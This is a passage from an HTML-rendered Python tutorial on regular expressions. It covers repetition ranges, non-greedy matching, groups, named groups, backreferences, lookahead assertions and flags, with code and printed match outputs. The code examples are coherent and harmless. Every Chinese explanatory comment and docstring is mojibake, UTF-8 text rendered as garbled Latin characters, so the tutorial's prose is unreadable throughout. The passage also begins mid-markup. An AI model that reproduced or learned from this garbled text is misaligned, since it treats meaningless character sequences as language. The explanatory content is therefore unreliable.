class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#é‡å¤åŒºé—´</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¯èƒ½æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬ä¸çŸ¥é“å…·ä½“è¦åŒ¹é…å­—ç¬¦ç»„è¦é‡å¤çš„æ¬¡æ•°ï¼Œæ¯”å¦‚èº«ä»½è¯æœ‰15ä½ä¹Ÿæœ‰18ä½çš„ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è¿™é‡Œé‡å¤åŒºé—´å°±å¯ä»¥å‡ºåœºäº†ï¼Œè¯­æ³•ï¼š&#123;M,N&#125;ï¼ŒMæ˜¯ä¸‹ç•Œè€ŒNæ˜¯ä¸Šç•Œ</span></span><br><span class="line"><span class="string">ä¸¾ä¸ªä¾‹å­ï¼š</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;[\d]&#123;3,4&#125;&#x27;</span>,<span class="string">&#x27;0731&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;[\d]&#123;3,4&#125;&#x27;</span>,<span class="string">&#x27;073&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">é€šè¿‡ä¸Šè¿°ä»£ç ï¼Œæˆ‘ä»¬å‘ç°[\d]&#123;3,4&#125; æ—¢å¯ä»¥åŒ¹é…3ä¸ªæ•°å­—ä¹Ÿå¯ä»¥åŒ¹é…4ä¸ªæ•°å­—ï¼Œ</span></span><br><span class="line"><span class="string">ä¸è¿‡å½“æœ‰4ä¸ªæ•°å­—çš„æ—¶å€™ï¼Œä¼˜å…ˆåŒ¹é…çš„æ˜¯4ä¸ªæ•°å­—ï¼Œè¿™æ˜¯å› ä¸ºæ­£åˆ™è¡¨è¾¾å¼é»˜è®¤æ˜¯è´ªå©ªæ¨¡å¼ï¼Œ</span></span><br><span class="line"><span class="string">å³å°½å¯èƒ½çš„åŒ¹é…æ›´å¤šå­—ç¬¦ï¼Œè€Œè¦ä½¿ç”¨éè´ªå©ªæ¨¡å¼ï¼Œæˆ‘ä»¬è¦åœ¨è¡¨è¾¾å¼åé¢åŠ ä¸Š ?å·</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">d = re.search(<span class="string">r&#x27;[\d]&#123;3,4&#125;?&#x27;</span>,<span class="string">&#x27;0734&#x27;</span>)</span><br><span class="line">e = re.search(<span class="string">r&#x27;[\d]&#123;2,3&#125;?&#x27;</span>,<span class="string">&#x27;073&#x27;</span>)</span><br><span class="line">print(d)</span><br><span class="line">print(e)</span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(0, 4), match=&#39;0731&#39;&gt;&lt;re.Match object; span=(0, 3), match=&#39;073&#39;&gt;&lt;re.Match object; span=(0, 3), match=&#39;073&#39;&gt;&lt;re.Match object; span=(0, 2), match=&#39;07&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¼€é—­åŒºé—´</span></span><br><span class="line"><span class="comment">#æœ‰æ—¶å€™æˆ‘ä»¬å¯èƒ½é‡åˆ°å­—ç¬¦ç»„çš„é‡å¤æ¬¡æ•°æ²¡æœ‰è¾¹ç•Œï¼š</span></span><br><span class="line"><span class="comment">#é—­åŒºé—´ä¸å†™å³å¯è¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªã€‚</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;[\d]&#123;1,&#125;&#x27;</span>,<span class="string">&#x27;0731 xxx&#x27;</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(0, 4), match=&#39;0731&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#é€Ÿå†™</span></span><br><span class="line"><span class="comment">#è¿˜å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªé€Ÿå†™å­—ç¬¦æŒ‡å®šå¸¸è§çš„é‡å¤æƒ…å†µï¼Œ</span></span><br><span class="line"><span class="comment">#å¯ä»¥ä½¿ç”¨ + åŒ¹é…1ä¸ªæˆ–å¤šä¸ªï¼Œ</span></span><br><span class="line"><span class="comment">#ä½¿ç”¨ *ä»£è¡¨0ä¸ªæˆ–å¤šä¸ª</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;[\d]+&#x27;</span>,<span class="string">&#x27;0731-8859456&#x27;</span>)</span><br><span class="line">b = re.findall(<span class="string">r&#x27;[\d]*&#x27;</span>,<span class="string">&#x27;ç¼–å·89758&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><pre><code>[&#39;0731&#39;, &#39;8859456&#39;][&#39;&#39;, &#39;&#39;, &#39;89758&#39;, &#39;&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åˆ†ç»„</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åœ¨Pythonæ­£åˆ™ä¸­è¿˜æä¾›äº†ä¸€ç§æœºåˆ¶å°†è¡¨è¾¾å¼â€”â€”åˆ†ç»„ï¼Œå½“ä½¿ç”¨åˆ†ç»„æ—¶ï¼Œ</span></span><br><span class="line"><span class="string">é™¤äº†è·å¾—æ•´ä¸ªåŒ¹é…ã€‚è¿˜èƒ½å¤Ÿåœ¨åŒ¹é…ä¸­é€‰æ‹©æ¯ä¸€ä¸ªåˆ†ç»„ã€‚</span></span><br><span class="line"><span class="string">è¦å®ç°åˆ†ç»„å¾ˆç®€å•ï¼Œä½¿ç”¨()å³å¯ã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;([\d]&#123;4&#125;)-([\d]&#123;7&#125;)&#x27;</span>,<span class="string">&#x27;å¼ ä¸‰ï¼š0731-8825951&#x27;</span>) <span class="comment">#æœªä½¿ç”¨åˆ†ç»„</span></span><br><span class="line">print(a.group())</span><br><span class="line">print(a.groups())</span><br><span class="line">print(a.group(<span class="number">1</span>))</span><br><span class="line">print(a.group(<span class="number">2</span>))</span><br></pre></td></tr></table></figure><pre><code>0731-8825951(&#39;0731&#39;, &#39;8825951&#39;)07318825951</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç»ƒä¹  è¯†åˆ«ä¸­å›½ç”µè¯å·ç </span></span><br><span class="line"><span class="comment">#ä¸­å›½åŒºå·ç è§„åˆ™å¦‚ä¸‹ï¼š (+)86-0XXï¼ˆ0XXXï¼‰-XXX-XXXXï¼ˆXXXX-XXXXï¼‰</span></span><br><span class="line">phone=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">+86-010-82866931</span></span><br><span class="line"><span class="string">86010-82866931</span></span><br><span class="line"><span class="string">010 8286 6931</span></span><br><span class="line"><span class="string">86(010)-69675217</span></span><br><span class="line"><span class="string">86(0731)-728-3333</span></span><br><span class="line"><span class="string">(0731)-2728-3353</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#è¯·ä½ ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å°†è¿™äº›å·ç æå–æˆåˆ†ç»„å½¢å¼</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å‘½ååˆ†ç»„</span></span><br><span class="line"><span class="comment">#ä¸€ä¸ªå‘½ååˆ†ç»„çš„è¯­æ³•æ˜¯åœ¨å¼€å§‹çš„â€œ(â€ä¹‹åï¼Œæ·»åŠ ?P&lt;group_name&gt;ï¼Œæ¥å®ç°åˆ†ç»„ï¼Œä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">a = re.search(<span class="string">r&#x27;[\d]&#123;4&#125;-[\d]&#123;7&#125;&#x27;</span>,<span class="string">&#x27;å¼ ä¸‰ï¼š0731-8825951&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;(?P&lt;first_group&gt;[\d]&#123;4&#125;)-(?P&lt;second_group&gt;[\d]&#123;7&#125;)&#x27;</span>,<span class="string">&#x27;å¼ ä¸‰ï¼š0731-8825951&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(a.group)</span><br><span class="line">print(a.groups)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span>*<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">print(b)</span><br><span class="line">print(b.group())</span><br><span class="line">print(b.groups())</span><br><span class="line">print(b.group(<span class="number">0</span>))</span><br><span class="line">print(b.group(<span class="number">1</span>))</span><br><span class="line">print(b.group(<span class="number">2</span>))</span><br><span class="line">print(<span class="string">&quot; -&quot;</span>*<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">print(b.group(<span class="string">&#x27;first_group&#x27;</span>))</span><br><span class="line">print(b.group(<span class="string">&#x27;second_group&#x27;</span>))</span><br><span class="line">print(b.groupdict())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">re.search()æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªre.Matchå¯¹è±¡ï¼Œè¿è¡Œä¸Šè¿°ä¾‹å­æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œä½¿ç”¨ ?P&lt;group_name&gt; å¯ä»¥å®ç°åˆ†ç»„ï¼Œ </span></span><br><span class="line"><span class="string">ä½¿ç”¨ .group(group_name)å°†åˆ†ç»„åä¼ å…¥group()å‡½æ•°å¯ä»¥è·å–å¯¹åº”åç§°åˆ†ç»„çš„æ•°æ®ï¼ŒåŒæ ·ä½¿ç”¨ç´¢å¼• ä¹Ÿæ˜¯å¯ä»¥è·å–å¯¹åº”åˆ†ç»„çš„æ•°æ®çš„ã€‚</span></span><br><span class="line"><span class="string">Matchå¯¹è±¡è¿˜æä¾›äº†ä¸€ä¸ªgroupdict()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åœ¨å’Œgroups()æ–¹æ³•ç±»ä¼¼ï¼Œä¸è¿‡å®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè€Œgroups()æ”¾å›çš„æ˜¯ä¸€ä¸ªå…ƒç¥–ã€‚</span></span><br><span class="line"><span class="string">ä¸è¿‡å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šgroupdict()åªä¼šè¿”å›å‘½ååˆ†ç»„è€Œä¸ä¼šè¿”å›éå‘½ååˆ†ç»„</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">match = re.search(<span class="string">r&#x27;(?P&lt;first_group&gt;[\d]&#123;4&#125;)-([\d]&#123;7&#125;)&#x27;</span>,<span class="string">&#x27;å¼ ä¸‰ï¼š0731-8825951&#x27;</span>) <span class="comment">#ä½¿ç”¨åˆ†ç»„</span></span><br><span class="line">print(match.group())</span><br><span class="line">print(match.groups())</span><br><span class="line">print(match.groupdict())</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ˜¯å‘½ååˆ†ç»„ï¼Œç¬¬äºŒä¸ªæ˜¯ç¼–ç åˆ†ç»„ï¼Œæ‰€ä»¥å½“è°ƒç”¨groups()æ—¶ï¼Œ</span></span><br><span class="line"><span class="string">è¿™ä¸¤ä¸ªåˆ†ç»„éƒ½åœ¨å…ƒç¥–ä¸­è¿”å›ï¼Œä½†æ˜¯ï¼Œå½“è°ƒç”¨groupdictæ—¶ï¼Œè¿™ä¸¤ä¸ªåˆ†ç»„åˆ™åªæœ‰å‘½ååˆ†ç»„è¢«è¿”å›äº†ï¼Œ</span></span><br><span class="line"><span class="string">å¦‚æœä»å¯ç»´æŠ¤çš„è§’åº¦æ¥è¯´ï¼Œå‘½ååˆ†ç»„ååˆ†æœ‰ä»·å€¼</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(3, 15), match=&#39;0731-8825951&#39;&gt;&lt;built-in method group of re.Match object at 0x0000016EDCFF0B90&gt;&lt;built-in method groups of re.Match object at 0x0000016EDCFF0B90&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;re.Match object; span=(3, 15), match=&#39;0731-8825951&#39;&gt;0731-8825951(&#39;0731&#39;, &#39;8825951&#39;)0731-882595107318825951 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -07318825951&#123;&#39;first_group&#39;: &#39;0731&#39;, &#39;second_group&#39;: &#39;8825951&#39;&#125;0731-8825951(&#39;0731&#39;, &#39;8825951&#39;)&#123;&#39;first_group&#39;: &#39;0731&#39;&#125;&#39;\nåœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ˜¯å‘½ååˆ†ç»„ï¼Œç¬¬äºŒä¸ªæ˜¯ç¼–ç åˆ†ç»„ï¼Œæ‰€ä»¥å½“è°ƒç”¨groups()æ—¶ï¼Œ\nè¿™ä¸¤ä¸ªåˆ†ç»„éƒ½åœ¨å…ƒç¥–ä¸­è¿”å›ï¼Œä½†æ˜¯ï¼Œå½“è°ƒç”¨groupdictæ—¶ï¼Œè¿™ä¸¤ä¸ªåˆ†ç»„åˆ™åªæœ‰å‘½ååˆ†ç»„è¢«è¿”å›äº†ï¼Œ\nå¦‚æœä»å¯ç»´æŠ¤çš„è§’åº¦æ¥è¯´ï¼Œå‘½ååˆ†ç»„ååˆ†æœ‰ä»·å€¼\n\n&#39;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¼•ç”¨å·²ç»å­˜åœ¨çš„åˆ†ç»„</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ­£åˆ™è¡¨è¾¾å¼è¿˜æä¾›äº†ä¸€ç§å¼•ç”¨ä¸€ä¸ªä¹‹å‰åŒ¹é…åˆ†ç»„çš„æœºåˆ¶ï¼Œæœ‰äº›æ—¶å€™ï¼Œæˆ‘ä»¬æˆ–è®¸ä¼šå¯»æ‰¾åˆ°ä¸€ä¸ªå­åŒ¹é…ï¼Œè¯¥åŒ¹é…ä¼šæ¥ä¸‹æ¥å†æ¬¡å‡ºç°ã€‚</span></span><br><span class="line"><span class="string">ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•è§£æä¸€æ®µXMLä»£ç ï¼Œæ¯”å¦‚ï¼š&lt;font&gt;æç¤º&lt;/font&gt;ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šç¼–å†™å‡ºè¿™æ ·ä¸€æ®µä»£ç ï¼š</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;&lt;[\w_-]+&gt;æç¤º&lt;/[\w_-]+&gt;&#x27;</span>,<span class="string">&#x27;&lt;font&gt;æç¤º&lt;/font&gt;&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸Šè¿°ä»£ç ç¡®å®å¯ä»¥åŒ¹é…ï¼Œä¸è¿‡ä¹Ÿå­˜åœ¨å¦ä¸€ç§æƒ…å†µï¼Œå¦‚æœè§£æçš„æ˜¯å¦‚ä¸‹æ•°æ®ï¼š&lt;font&gt;æç¤º&lt;/bar&gt;</span></span><br><span class="line">b = re.search(<span class="string">r&#x27;&lt;([\w_-]+)&gt;æç¤º&lt;(/[\w_-]+)&gt;&#x27;</span>,<span class="string">&#x27;&lt;font&gt;æç¤º&lt;/bar&gt;&#x27;</span>)</span><br><span class="line">print(b)</span><br><span class="line">print(b.group(<span class="number">1</span>))</span><br><span class="line">print(b.group(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot; -&quot;</span>*<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯èƒ½ç›´è§‰çš„æƒ³è®©åé¢åˆ†ç»„çš„æ­£åˆ™ä¹ŸåŒ¹é…fontï¼Œä¸è¿‡å®é™…æƒ…å†µç¡®æ˜¯ï¼Œ</span></span><br><span class="line"><span class="comment">#æ‰€æœ‰å½¢å¼çš„éƒ½ä¼šåŒ¹é…ï¼Œé‚£å¦‚æœæˆ‘ä»¬æƒ³è®©åé¢çš„æ­£åˆ™å’Œç¬¬ä¸€ä¸ªåˆ†ç»„çš„æ­£åˆ™è¯¥å¦‚ä½•åšå‘¢ï¼Ÿ</span></span><br><span class="line"><span class="comment">#å¯ä»¥ä½¿ç”¨åˆ†ç»„å¼•ç”¨ï¼Œä½¿ç”¨\Nå³å¯å›æº¯å¼•ç”¨ç¼–å·ä¸ºNçš„åˆ†ç»„ï¼Œå› æ­¤ä¸Šè¿°ä¾‹å­çš„ä»£ç æˆ‘ä»¬å¯ä»¥æ”¹ä¸ºï¼š</span></span><br><span class="line"></span><br><span class="line">a = re.search(<span class="string">r&#x27;&lt;([\w_-]+)&gt;æç¤º&lt;/\1&gt;&#x27;</span>,<span class="string">&#x27;&lt;font&gt;æç¤º&lt;/bar&gt;&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;&lt;([\w_-]+)&gt;æç¤º&lt;/\1&gt;&#x27;</span>,<span class="string">&#x27;&lt;font&gt;æç¤º&lt;/font&gt;&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b.group())</span><br><span class="line">print(b.groups())</span><br><span class="line"><span class="comment">#é€šè¿‡ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å›æº¯å¼•ç”¨å–ä»£äº†ç¬¬äºŒä¸ªåˆ†ç»„ã€‚æ‰€ä»¥ä¸fontä¸åŒçš„å°±æ— æ³•åŒ¹é…äº†ï¼›</span></span><br><span class="line"><span class="comment">#å€¼çš„æ³¨æ„çš„æ˜¯ï¼šè¿™é‡Œåªæ˜¯ä¸€ä¸ªä½œä¸ºä»‹ç»å›æº¯å¼•ç”¨çš„ä¾‹å­ï¼Œ</span></span><br><span class="line"><span class="comment">#åœ¨å®é™…å¼€å‘ä¸­æˆ‘ä»¬ä¸åº”è¯¥ç”¨è¿™ç§æ–¹å¼å»è§£æXMLæ–‡æ¡£ï¼Œå¯ä»¥ä½¿ç”¨beautifulSoapç­‰åŒ…å»è§£æXMLæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(0, 15), match=&#39;&lt;font&gt;æç¤º&lt;/font&gt;&#39;&gt;&lt;re.Match object; span=(0, 14), match=&#39;&lt;font&gt;æç¤º&lt;/bar&gt;&#39;&gt;font/bar - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -None&lt;font&gt;æç¤º&lt;/font&gt;(&#39;font&#39;,)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å…ˆè¡Œæ–­è¨€</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;n(?!e)&#x27;</span>,<span class="string">&#x27;final&#x27;</span>)</span><br><span class="line">b = re.findall(<span class="string">r&#x27;n(?!e)&#x27;</span>,<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"><span class="comment">#æ­£å‘å…ˆè¡Œæ–­è¨€</span></span><br><span class="line">c = re.findall(<span class="string">r&#x27;n(?=e)&#x27;</span>,<span class="string">&#x27;final&#x27;</span>)</span><br><span class="line">d = re.findall(<span class="string">r&#x27;n(?=e)&#x27;</span>,<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line">e = re.findall(<span class="string">r&#x27;n(?=e)&#x27;</span>,<span class="string">&#x27;jasmine&#x27;</span>)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br><span class="line">print(e)</span><br></pre></td></tr></table></figure><pre><code>[&#39;n&#39;][&#39;n&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[][][&#39;n&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ ‡è®°ï¼Œä¸åŒºåˆ†å¤§å°å†™</span></span><br><span class="line"><span class="comment">#æœ€ç®€å•ç›´æ¥çš„æ ‡è®°æ˜¯ re.IGNORECASEï¼Œä»–ä¼šå¯¼è‡´æ­£åˆ™è¡¨è¾¾å¼å˜ä¸ºä¸åŒºåˆ†å¤§å°å†™</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;python&#x27;</span>,<span class="string">&#x27;I LIKE PYTHON&#x27;</span>,re.IGNORECASE)</span><br><span class="line">b = re.search(<span class="string">r&#x27;python&#x27;</span>,<span class="string">&#x27;I LIKE PYTHON&#x27;</span>,re.I)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç‚¹åŒ¹é…æ¢è¡Œç¬¦</span></span><br><span class="line"><span class="comment">#re.DOTALLæ ‡è®°ï¼ˆåˆ«åä¸ºre.Sï¼‰å¯ä»¥è®© .å­—ç¬¦é™¤äº†åŒ¹é…å…¶ä»–å­—ç¬¦ä¹‹å¤–ï¼Œè¿˜åŒ¹é…æ¢è¡Œç¬¦ã€‚</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;.+&#x27;</span>,<span class="string">&#x27;hello\nworld&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;.+&#x27;</span>,<span class="string">&#x27;hello\nworld&#x27;</span>,re.S)</span><br><span class="line">c = re.search(<span class="string">r&#x27;.+&#x27;</span>,<span class="string">&#x27;hello\nworld&#x27;</span>,re.DOTALL)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"><span class="comment">#è¯¦ç»†æ¨¡å¼</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">re.VERBOSEæ ‡è®°(åˆ«åä¸ºre.X)å…è®¸å¤æ‚çš„æ­£åˆ™è¡¨è¾¾å¼ä»¥æ›´å®¹æ˜“çš„æ–¹å¼è¡¨ç¤º</span></span><br><span class="line"><span class="string">è¯¥æ ‡è®°åšä¸¤ä»¶äº‹ï¼Œé¦–å…ˆï¼Œä»–å¯¼è‡´æ‰€æœ‰çš„ç©ºç™½ï¼ˆé™¤äº†å­—ç¬¦ç»„ä¸­ï¼‰è¢«å¿½ç•¥ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ã€‚</span></span><br><span class="line"><span class="string">å…¶æ¬¡ï¼Œå®ƒå°†#å­—ç¬¦ï¼ˆåŒæ ·ï¼Œé™¤éåœ¨å­—ç¬¦ç»„å†…ï¼‰å½“åšæ³¨é‡Šå­—ç¬¦</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#è°ƒè¯•æ¨¡å¼</span></span><br><span class="line"><span class="comment">#re.DEBUG æ ‡è®°ï¼ˆæ²¡æœ‰åˆ«åï¼‰åœ¨ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼æ—¶å°†ä¸€äº›è°ƒè¯•ä¿¡æ¯è¾“å‡ºåˆ°sys.stderr</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä½¿ç”¨å¤šä¸ªæ ‡è®°</span></span><br><span class="line"><span class="string">å¯èƒ½æˆ‘ä»¬è¿˜éœ€è¦åŒæ—¶ä½¿ç”¨å¤šä¸ªæ ‡è®°ï¼Œä¸ºäº†å®Œæˆè¿™ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨|æ“ä½œç¬¦ã€‚</span></span><br><span class="line"><span class="string">æ­£ç¡®çš„è¯­æ³•æ˜¯ä¾‹å¦‚ï¼šre.DOTALL|re.MULTILINE æˆ– re.S | re.M</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#å†…è”æ ‡è®°</span></span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line">f = re.search(<span class="string">&#x27;(?i)Foo&#x27;</span>,<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line">print(f)</span><br><span class="line"><span class="comment">#å¯ä»¥å‘ç°è¿™é‡Œçš„(?i)ï¼Œå°±ç­‰åŒäºä½¿ç”¨re.IGNORECASE æ ‡è®°ã€‚</span></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(7, 13), match=&#39;PYTHON&#39;&gt;&lt;re.Match object; span=(7, 13), match=&#39;PYTHON&#39;&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;re.Match object; span=(0, 5), match=&#39;hello&#39;&gt;&lt;re.Match object; span=(0, 11), match=&#39;hello\nworld&#39;&gt;&lt;re.Match object; span=(0, 11), match=&#39;hello\nworld&#39;&gt; - - - - - - - 